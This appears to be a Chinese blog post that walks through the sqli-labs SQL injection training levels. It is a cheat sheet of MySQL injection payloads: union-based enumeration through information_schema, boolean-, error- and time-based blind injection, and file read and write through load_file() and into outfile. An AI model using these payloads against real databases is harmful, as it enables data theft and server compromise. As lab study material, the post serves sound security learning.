---
typora-root-url: ../../../static
title: "sqli_labs通关"
date: 2020-11-28T20:04:36+08:00
draft: false
tags: ["sqli"]
categories: ["security"]
---

## 前置知识
### 常用函数
- version()：mysql版本；
- user()：当前数据库链接用户名；
- database()：当前链接数据库名；
- @@datadir：数据库路径；
- @@version_compile_os：操作系统版本；

例子如下：

![常用函数][p0]

### 字符串连接函数
- concat(str1,str2,...)：没有分隔符的连接字符串。
- concat_ws(separator,str1,str2,...)：含有分隔符的连接字符串。
- group_concat(str1,str2,...)：连接列的所有数据，并以逗号分割每一条数据。

例子如下：

![concat][p1]
![concat_ws][p2]
![group_concat][p3]

### 注释符
- #： `#` 号末尾的都被注释；
- --单个字符： `--单个字符` 末尾的都被注释；

例子如下：

![#和--x][p4]

### 常用命令
- show databases：显示所有数据库；
- use xxxDatabase：使用某个数据库；
- show tables：显示当前数据库下的所有数据表；
- desc xxxtable：显示某个表的结构信息（列信息）；

### information_schema数据库
- 查数据库： `select schema_name from information_schema.schemata;` 
- 查表： `select table_name from information_schema.tables where table_schema=xxxDatabase;` 
- 查列： `select column_name from information_schema.columns where table_name='users';` 

例子如下：

![常用命令][p5]

### 基于布尔的盲注
主要思想就是构造逻辑判断，主要分为以下几种常用手法：

- `left(a,b)` 函数：从左侧截取a的前b位。
- `substr(a,b,c)` 函数：从b位置开始，截取字符串a的c长度。
- `ascii()` 函数：将某个字符转换为ascii值。
- `mid(a,b,c)` 函数：从位置b开始，截取a字符串的c位。
- `ord()` 函数：同ascii()，将字符转为ascii值。
- regexp正则注入：例如， `select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));` 。
- ike匹配注入：例如，`select id,username,password from users where 1=(user() like 'roo%');` 。

### 基于报错的盲注
主要思想就是让数据暴露在报错信息中，当盲注和报错注入同时可用时，优先使用报错注入，以下几种常用的手法：

- `extractvalue(1,exp)` 函数：例如， `select extractvalue(1,@@datadir);` 。
- `updatexml(1,exp,1)` 函数：例如， `select updatexml(1,@@datadir,1);` 。
- 常用的报错注入方式： `select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;` ,可以简化成： `select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));` ,如果关键表被禁用了，可以变成： `select count(*) from(select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2));` ,如果rand()被禁用了，可以变成： `select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2);` 。
- 利用重复报错特性：例如， `select * from(select NAME_CONST(version(),1),NAME_CONST(version(),1))x;` 。
- 利用溢出报错特性（需要一定版本要求）： 例如， `select exp(~(select * FROM(SELECT USER())a));` 或者 `select !(select * from(select user())x)- ~0;` 。

还有一个特殊的重复报错方式如下,可以爆列名，如果information_schema数据库被禁用，可以使用这个方式：

	mysql> select *  from(select * from test a join test b)c;
	ERROR 1060 (42S21): Duplicate column name 'id'
	mysql> select *  from(select * from test a join test b using(id))c;
	ERROR 1060 (42S21): Duplicate column name 'name'

### 基于时间的盲注
- `sleep()` 函数：例如， `select * from information_schema.tables where 1=1 and if(mid(user(),1,1)=char(114),sleep(5),1);` 。
- `benchmark()` 函数：例如， `select if(mid(version(),1,1)=8,benchmark(5000000,md5('hack_by_p1n93r')),null) from users;` 。

### 导入导出相关操作
- `load_file()` 函数：例如，`select load_file(0x433a5c55736572735c31383134385c4465736b746f705c6e6578742e747874);` 。
- `select ... into outfile ` 函数：例如，`select 0x6861636b65645f62795f70316e393372 into outfile 'C:/Users/18148/Desktop/hack.txt';` 。

***注意：*** :高版本的mysql，即使是root权限，也默认不允许进行文件的导入和导出，只能在mysql的secure-file-priv设置的目录下进行导入和导出操作。


## Notice
只打一些有代表性的过关，目的是过一遍理论知识。没时间全部打，事实上很多关没有代表性，还不如打CTF的SQLI，比较有代表性。

## Less-1~4
1. 在参数后面加一个 `'` ，根据报错显示得知是字符型注入。
2. 闭合单引号，且使用注释符把后面的SQL注释掉。
3. 使用 `order by` 探测表的列数。
4. 使用 `union(all) select` 联合查询数据。
5. 使用 `information_schema` 数据库进行查询。

爆数据库：

![less-1爆数据库][p6]

爆表：

![less-1爆表][p7]

爆列：

![less-1爆列][p8]

爆数据：

![less-1爆数据][p9]

## Less-5
没有数据回显，但是查询成功和查询失败的响应有区别，所以可以用基于布尔和时间的盲注，且能显示错误信息，所以可以利用基于报错的盲注。

① 基于布尔的盲注例子如下：

![基于布尔的盲注][p10]

② 基于时间的盲注例子如下(payload的设置和前面一样)：

![基于时间的盲注][p11]

③ 基于报错的盲注例子如下：

![基于报错的盲注][p12]

## Less-7
这一关就是提示我们使用文件导入导出来进行通关，这里演示使用load_file()和outfile的常用手法：

① 使用 `outfile` 写入可执行文件：

![outfile写入可执行文件][p13]

![outfile写入成功][p14]

② 使用 `load_file()` 和 `outfile` 结合：

![结合使用][p15]

![结合效果][p16]














[p0]:/media/2020-11-28-1.png
[p1]:/media/2020-11-28-2.png
[p2]:/media/2020-11-28-3.png
[p3]:/media/2020-11-28-4.jpg
[p4]:/media/2020-11-28-5.jpg
[p5]:/media/2020-11-28-6.png
[p6]:/media/2020-11-29-1.png
[p7]:/media/2020-12-03-1.png
[p8]:/media/2020-12-03-2.png
[p8]:/media/2020-12-03-4.png
[p9]:/media/2020-12-03-3.png
[p10]:/media/2020-12-09-1.png
[p11]:/media/2020-12-09-2.png
[p12]:/media/2020-12-09-3.png
[p13]:/media/2020-12-09-4.png
[p14]:/media/2020-12-09-5.png
[p15]:/media/2020-12-09-6.png
[p16]:/media/2020-12-09-7.png